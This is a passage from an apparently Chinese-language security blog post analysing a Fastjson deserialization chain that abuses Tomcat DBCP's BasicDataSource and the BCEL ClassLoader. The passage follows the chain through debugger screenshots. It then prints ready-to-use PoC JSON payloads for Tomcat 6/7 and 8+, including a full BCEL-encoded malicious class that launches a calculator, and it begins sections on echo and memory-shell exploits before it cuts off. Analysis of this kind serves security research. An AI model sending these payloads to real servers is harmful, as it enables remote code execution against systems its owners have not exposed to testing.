str)</code>反序列化中，会对getXXX的返回值进行判断，返回类型只能为<code>Collection</code>、<code>Map</code>、<code>AtomicBoolean</code>、<code>AtomicInteger</code>、<code>AtomicLong</code>这几个类型；而<code>BasicDataSource#getConnection</code>的返回类型是<code>Connction</code>，因此不满足使用条件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666841241851-d5119dbf-e993-4fc8-8eb6-360b57abb017.png#averageHue=%23f9f8f7&clientId=ua4aa9c72-4c8e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=535&id=u1f36685a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1234&originWidth=1818&originalType=binary&ratio=1&rotation=0&showTitle=false&size=421192&status=done&style=none&taskId=u09f1f10c-599c-4876-a3a8-d0b36ca8549&title=&width=788" alt="image.png"></p><h4 id="2-3-2-JSON-parseObject"><a href="#2-3-2-JSON-parseObject" class="headerlink" title="2.3.2 JSON.parseObject()"></a>2.3.2 JSON.parseObject()</h4><p>解决上面问题的办法，也有，网上公开的<br>即在示例代码中将<code>JSON.parse()</code>修改为<code>JSON.parseObject()</code>，此时触发了代码；但是并不能保证目标都是使用<code>parseObject</code>方法去解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;             \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       &#125;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;driverClassName\&quot;: \&quot;&quot;</span>+bcel+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;      &#125;&quot;</span>;</span><br><span class="line">System.out.println(str);</span><br><span class="line">JSON.parseObject(str);</span><br></pre></td></tr></table></figure><h5 id="2-3-2-1-JSON-toJSON-obj"><a href="#2-3-2-1-JSON-toJSON-obj" class="headerlink" title="2.3.2.1 JSON.toJSON(obj)"></a>2.3.2.1 JSON.toJSON(obj)</h5><ol><li>调试parseObject，如图，parse是一个正常的反序列化解析，后面返回一个<code>JSON.toJSON(obj);</code></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666853819155-01c0a031-3ef4-46c3-a554-2ad331ca8d2d.png#averageHue=%23faf4f2&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=347&id=uf36294e7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=694&originWidth=1048&originalType=binary&ratio=1&rotation=0&showTitle=false&size=130437&status=done&style=none&taskId=u6e3e0351-7aa1-4887-9b19-3fe29a56674&title=&width=524" alt="image.png"></p><h5 id="2-3-2-2-createJavaBeanSerializer和createASMSerializer中创建sortedGetters"><a href="#2-3-2-2-createJavaBeanSerializer和createASMSerializer中创建sortedGetters" class="headerlink" title="2.3.2.2 createJavaBeanSerializer和createASMSerializer中创建sortedGetters"></a>2.3.2.2 createJavaBeanSerializer和createASMSerializer中创建sortedGetters</h5><ol start="2"><li>进入toJSON方法，执行流程 <code>config.getObjectWriter(clazz)</code> -&gt; <code>createJavaBeanSerializer(clazz)</code></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666853961244-1626e359-9971-4851-afdb-bf8e14434b4f.png#averageHue=%23faf3f2&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=464&id=u02946279&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1312&originWidth=1740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=307612&status=done&style=none&taskId=u528fa4d8-8ca9-4b77-95d3-e6c43622a94&title=&width=615" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854100074-bbf49612-90e7-4bb8-8fc8-183a228554f6.png#averageHue=%23f9f6f6&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=572&id=ue761ce8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1694&originWidth=1784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=396075&status=done&style=none&taskId=u25591307-34c2-4a30-befa-bb0d1f65102&title=&width=602" alt="image.png"></p><ol start="3"><li>在<code>createJavaBeanSerializer</code> 中关注一下<code>TypeUtils.buildBeanInfo(clazz, null, propertyNamingStrategy);</code>，这里分析这个位置的原因是，从后面的触发点来看，是取的<code>beanInfo</code>中的<code>sortedGetters</code>中的<code>FieldInfo</code>进行操作，因此先看看这些<code>get</code>方法什么时候被取到的</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854171555-22e7e6c4-0cd9-43fa-a80f-50045df3a2ac.png#averageHue=%23f8f1ef&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=396&id=ufe73af81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=960&originWidth=1892&originalType=binary&ratio=1&rotation=0&showTitle=false&size=290178&status=done&style=none&taskId=u6bf428ea-fa0e-4ee9-9dea-80ca766ddf6&title=&width=780" alt="image.png"></p><ol start="4"><li>可以看到，这里的<code>computeGetters(beanType, jsonType, aliasMap, fieldCacheMap, false, propertyNamingStrategy);</code></li></ol><p>不管从方法名上还是调试中，都是和获取<code>get</code>相关方法的<code>FieldInfo</code>相关<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854367136-39c97a7a-fe2d-4360-93ca-29d15070c46c.png#averageHue=%23f9f6f6&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=641&id=u7ae14e7e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1564&originWidth=1958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=401017&status=done&style=none&taskId=ubba81e46-fd38-47de-8f1a-7f7c37e2d9d&title=&width=803" alt="image.png"></p><ol start="5"><li>如图获取了所有的方法，并对方法名进行判断，其中包括一个条件即<code>getXXX</code>的方法，最终构造一个<code>FieldInfo</code>，存入<code>fieldInfoMap</code>中并遍历到<code>fieldInfoList</code>中返回</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854586165-0deed445-c45b-4617-bea4-9b265bc07bb0.png#averageHue=%23f9f7f5&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=694&id=u3aaa7648&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1714&originWidth=2108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=440507&status=done&style=none&taskId=u17be552e-033f-4372-9b93-6601b6399fd&title=&width=853" alt="image.png"></p><ol start="6"><li>最终<code>buildBeanInfo</code>返回一个<code>SerializeBeanInfo</code>的<code>BeanInfo</code>对象</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854849360-d8369378-570f-4b10-8276-a1e78c15c527.png#averageHue=%23f8f7f6&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=517&id=u648c416d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1468&originWidth=1884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=332485&status=done&style=none&taskId=u53cff068-d2f2-41f5-beed-43fc180c84f&title=&width=663" alt="image.png"></p><ol start="7"><li>接下来，在<code>createASMSerializer</code>时，判断接口字段信息是否有field为空、方法不为空，且方法不是实现的接口中的方法时，又进入了new JavaBeanSerializer(clazz)中；</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855161299-b3e77726-4d6d-40a7-825e-7b174a1e8dd6.png#averageHue=%23f6f3ef&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=556&id=u694bac0c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1534&originWidth=2192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=538307&status=done&style=none&taskId=ua60edc8d-5267-4ea0-8268-9121e083d8f&title=&width=794" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855069428-90cd50f0-2d3a-4ab0-9938-74c66488daea.png#averageHue=%23f6f4f0&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=508&id=u11fc71e6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1476&originWidth=2298&originalType=binary&ratio=1&rotation=0&showTitle=false&size=610625&status=done&style=none&taskId=u7b7ae460-7325-45f5-bb61-f04db6b7d8e&title=&width=791" alt="image.png"></p><ol start="8"><li>完成实例化<code>JavaBeanSerializer</code>后，返回<code>serializer</code></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855326621-1e1d218a-92fa-47d6-931d-da823e8e18e4.png#averageHue=%23f7f3f1&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=723&id=u6a9a9165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1676&originWidth=1832&originalType=binary&ratio=1&rotation=0&showTitle=false&size=420418&status=done&style=none&taskId=u06d1b52b-11ec-4e19-b5f9-c84782f220a&title=&width=790" alt="image.png"></p><h5 id="2-3-2-3-FieldInfo-get-方法触发invoke执行"><a href="#2-3-2-3-FieldInfo-get-方法触发invoke执行" class="headerlink" title="2.3.2.3 FieldInfo.get()方法触发invoke执行"></a>2.3.2.3 FieldInfo.get()方法触发invoke执行</h5><ol start="9"><li>一路返回，到第二步，这里将sortedGetters中的FieldInfo，放到Map中，即图中的values</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855544092-b277870e-aa13-4ba7-816b-f15e46d357eb.png#averageHue=%23f8f5f3&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=608&id=uea4ec959&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1590&originWidth=2084&originalType=binary&ratio=1&rotation=0&showTitle=false&size=377080&status=done&style=none&taskId=u38dcacc8-318a-4674-9f16-1ec9a769ac9&title=&width=797" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">getFieldValuesMap</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; map = <span class="keyword">new</span> LinkedHashMap&lt;String, Object&gt;(sortedGetters.length);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (FieldSerializer getter : sortedGetters) &#123;</span><br><span class="line">        map.put(getter.fieldInfo.name, getter.getPropertyValue(object));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855721086-9c71be9d-2bba-4b7f-958c-cd4a78674ef4.png#averageHue=%23f9f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=683&id=u014315ea&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1656&originWidth=2024&originalType=binary&ratio=1&rotation=0&showTitle=false&size=405009&status=done&style=none&taskId=u7ec0957a-9055-4e77-81da-dc046fc9ea6&title=&width=835" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855798118-aa6455ae-10be-4f5a-a190-09d058614c74.png#averageHue=%23f8f8f5&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=524&id=ubf9d60c5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1432&originWidth=2306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=387665&status=done&style=none&taskId=u723ced45-e1a5-410f-885a-86e1cdbcde3&title=&width=844" alt="image.png"><br>进入<code>FieldInfo.get</code>方法，这里执行了<code>invoke</code>，触发了<code>getConnection()</code>方法的调用；也就触发了<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource#createConnectionFactory</code>，导致了恶意类加载<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855834125-e3fdd337-faf2-4393-9bd4-f63ad91e3590.png#averageHue=%23f8f7f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=498&id=uc49448da&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1268&originWidth=2278&originalType=binary&ratio=1&rotation=0&showTitle=false&size=329805&status=done&style=none&taskId=ua9ce33ad-af30-4a4f-bda3-5e075b35e1d&title=&width=894" alt="image.png"></p><h4 id="2-3-3-如何使用JSON-parse-触发"><a href="#2-3-3-如何使用JSON-parse-触发" class="headerlink" title="2.3.3 如何使用JSON.parse()触发"></a>2.3.3 如何使用JSON.parse()触发</h4><p><em>实际场景中，目标不一定使用</em><code>_JSON.parseObject(String str)_</code><em>进行解析</em></p><h5 id="2-3-3-1-Type为JSONObject类时"><a href="#2-3-3-1-Type为JSONObject类时" class="headerlink" title="2.3.3.1 @Type为JSONObject类时"></a>2.3.3.1 @Type为JSONObject类时</h5><p>如图的解析流程中，当<code>@type</code>类型是<code>JSONObject.class</code>时，会调用<code>key.toString()</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666857860802-07c08ecb-16fa-4469-9fcc-985307b5e64b.png#averageHue=%23f8f8f7&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=852&id=uebd73a9b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2184&originWidth=2060&originalType=binary&ratio=1&rotation=0&showTitle=false&size=715195&status=done&style=none&taskId=u64fb8721-fcad-43e7-a619-5c475ca5f4b&title=&width=804" alt="image.png"></p><h5 id="2-3-3-2-执行到key-toString-方法"><a href="#2-3-3-2-执行到key-toString-方法" class="headerlink" title="2.3.3.2 执行到key.toString()方法"></a>2.3.3.2 执行到key.toString()方法</h5><p>当<code>JSONObject</code>这个类标签解析完成后，执行到<code>key.toString()</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666948632780-ddaa2378-7f04-49ff-8f83-f6ee415d97da.png#averageHue=%23f8f5f4&clientId=u6d26b6aa-6b88-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=583&id=u58fd35d3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1604&originWidth=2496&originalType=binary&ratio=1&rotation=0&showTitle=false&size=447246&status=done&style=none&taskId=u7ae6d8b2-283b-4268-96e9-8b7ed7972a1&title=&width=907" alt="image.png"><br>执行到<code>JSON#toJSONString()</code>方法；进入<code>new JSONSerializer(out).write(this)</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666858440910-5d09e9c8-abf9-412d-8083-988a101d943f.png#averageHue=%23f7f7f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=712&id=u7a67c9ec&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1666&originWidth=2010&originalType=binary&ratio=1&rotation=0&showTitle=false&size=528895&status=done&style=none&taskId=ufae3a256-b8ac-4f5a-9b22-69a2590f916&title=&width=859" alt="image.png"></p><h5 id="2-3-3-3-触发invoke"><a href="#2-3-3-3-触发invoke" class="headerlink" title="2.3.3.3 触发invoke"></a>2.3.3.3 触发invoke</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666858777493-0914c5a0-a3e8-4aee-865c-a0b4035c828b.png#averageHue=%23f9f8f7&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=1377&id=u16068f40&margin=%5Bobject%20Object%5D&name=image.png&originHeight=3350&originWidth=2292&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1061777&status=done&style=none&taskId=ue8c4e6f5-b407-4916-affa-04d87473e0b&title=&width=942" alt="image.png"><br>这里看到<code>getObjectWriter</code>，就和<strong>2.3.2.2 <strong>类似了；进入<code>preWriter.writer</code>方法，跟踪到<code>propertyValue = fieldSerializer.getPropertyValueDirect(object);</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666859226689-5c2a909a-8503-4585-9e92-9f56efd0a50a.png#averageHue=%23f7f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=1402&id=ud0349218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=3796&originWidth=2180&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1672071&status=done&style=none&taskId=ub2cb3daf-2c5f-4574-b991-f4d34811cf4&title=&width=805" alt="image.png"><br>和</strong>2.3.2.3</strong>一样的触发invoke执行代码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666859330378-13c1234d-bb99-4e5e-b6fe-4be4031e6a2b.png#averageHue=%23f9f3f2&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=391&id=u62f8b730&margin=%5Bobject%20Object%5D&name=image.png&originHeight=998&originWidth=2022&originalType=binary&ratio=1&rotation=0&showTitle=false&size=240448&status=done&style=none&taskId=u19067f1a-a80e-4d9d-af81-310e5240f26&title=&width=792" alt="image.png"></p><h5 id="2-3-3-4-poc构造"><a href="#2-3-3-4-poc构造" class="headerlink" title="2.3.3.4 poc构造"></a>2.3.3.4 poc构造</h5><p>poc如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">  &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">  &quot;x&quot;:&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">    &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">  &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而实际上在最开始的<code>parse()</code>方法中，进入parseObject之前，传入的object就是JSONObject类，因此不需要带上 <code>&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666860260058-5c4239a4-dab4-42a0-8d65-d76ad6b55569.png#averageHue=%23f7f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=571&id=u7287cd99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1566&originWidth=1814&originalType=binary&ratio=1&rotation=0&showTitle=false&size=410130&status=done&style=none&taskId=u749495a5-39b2-44f7-b22c-60353a4a05c&title=&width=662" alt="image.png"></p><p>这样便带来一个疑问，<code>@type</code>字段的解析和不带<code>@type</code>的解析有什么区别<br>如图，传入的object类型是个Map类型，查看一下<code>JSONObject</code>类，确实implements <code>Map</code>接口<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666860518018-668d46c3-1138-4f29-8af1-716dda405b42.png#averageHue=%23f6f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=1083&id=u40317ccb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2948&originWidth=1758&originalType=binary&ratio=1&rotation=0&showTitle=false&size=859645&status=done&style=none&taskId=u11da7593-9762-434b-81c1-b7149920449&title=&width=646" alt="image.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">## tomcat6、7</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">      &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## &gt; tomcat8</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">      &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;= tomcat7.x--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- tomcat6.x的依赖包路径：org.apache.tomcat dbcp 版本号--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.100<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&gt;= tomcat8.x--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-3-4-回显和内存马EXP"><a href="#2-3-4-回显和内存马EXP" class="headerlink" title="2.3.4 回显和内存马EXP"></a>2.3.4 回显和内存马EXP</h4><p>首先可以确定的是，能用这个利用链肯定有tomcat的dbcp包，所以构造一下tomcat的回显和内存马即可</p><h5 id="2-3-4-1-恶意代码块位置"><a href="#2-3-4-1-恶意代码块位置" class="headerlink" title="2.3.4.1 恶意代码块位置"></a>2.3.4.1 恶意代码块位置</h5><p>之前在构造shiro反序列化的时候，会将代码都放到默认构造方法中，因为最终会生成实例化对象，但是这里只是<code>Class.forName(String name)</code>，查看这个方法，实际上默认执行Class.forName(String name) 相当于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(String name, <span class="keyword">true</span>, ClassLoader.getClassLoader(Reflection.getCallerClass()))</span><br></pre></td></tr></table></figure><p>因此会执行<code>static</code>中的代码块<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666861809768-51988120-e348-4d11-8e57-91d3df6e74f8.png#averageHue=%23fbf9f8&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=571&id=ub8e5b026&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1574&originWidth=1550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=342701&status=done&style=none&taskId=uf319ddac-3fe0-4ca3-b856-6858d35c1fe&title=&width=562" alt="image.png"><br>使用案例测试一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666862170074-f23c5bad-6348-46a9-b981-71490ef8dc7e.png#averageHue=%23f9f9f9&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=401&id=u392f4915&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1184&originWidth=1258&originalType=binary&ratio=1&rotation=0&showTitle=false&size=172793&status=done&style=none&taskId=u0e7da16f-019c-4911-b922-4d5686a17ea&title=&width=426" alt="image.png"></p><h5 id="2-3-4-2-弹出计算器"><a href="#2-3-4-2-弹出计算器" class="headerlink" title="2.3.4.2 弹出计算器"></a>2.3.4.2 弹出计算器</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,                </span><br><span class="line">            <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>               </span><br><span class="line">                        &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$90$cdJ$c3$40$U$85$cfm$da$s$c6$d6$feh$fd$5b$v$I$a6$$$9a$85$cb$W$a1$U$5c$v$8a$R$5dO$c7$a1LM$93$90LE$9f$c8u7$w$$$7c$A$lJ$bc$J$F$L$O3s$b8$973$df$e1$ce$f7$cf$e7$X$80S$ec$Thh$83$I$cd$a9x$S$7e$u$a2$89$7f5$9e$wilX$E7$88$e7$a9T$e7$3aT$84$ea$b0$97$9b$I$ce$40$86$3a$d2$e6$8c$60y$dd$3bBy$U$3f$b0$a1$f5$c7$b8$99GF$cf$94$N$97$n$Te$965$a1$e3u$_$fe$d9$fa5$d4Pw$b1$8e$N$82$X$t$w$3a$f0$83$97$cc$a8$99$3fL$92PKat$ie$feH$84r$k$K$T$a7$3d$91$q$O$9a$i$ad$9e$95$q$i$7b$x$d4$c0$a4$3a$9a$f4W$83$ae$d3X$aa$y$e3$a066$f3$a0$zB$3d0B$3e$5e$8a$e4V$8c$8b$f9$G$c5P5$ec$c0qQ$c6$$$OQb$cdW$J$Ol$3e$845$ae$8e$60q$Hh$bc$f2$t$5d$7c$a0$d1n$bd$a1s$bf$e0$Wa$9bo$L$c4$3b$H$z_$b4X$89$b5r$f2$8e$bdE$81$qT$Kp$f5$X$Rg$_$92$8e$B$A$A&quot;</span>        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666863899326-e3799c34-1997-46f7-9834-bea5084c3f5e.png#averageHue=%23ecebe9&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=612&id=uf523758f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1224&originWidth=2774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=803603&status=done&style=none&taskId=uacafbb70-2621-4372-8641-476818b1d19&title=&width=1387" alt="image.png"></p><h5 id="2-3-4-3-回显"><a href="#2-3-4-3-回显" class="headerlink" title="2.3.4.3 回显"></a>2.3.4.3 回显</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 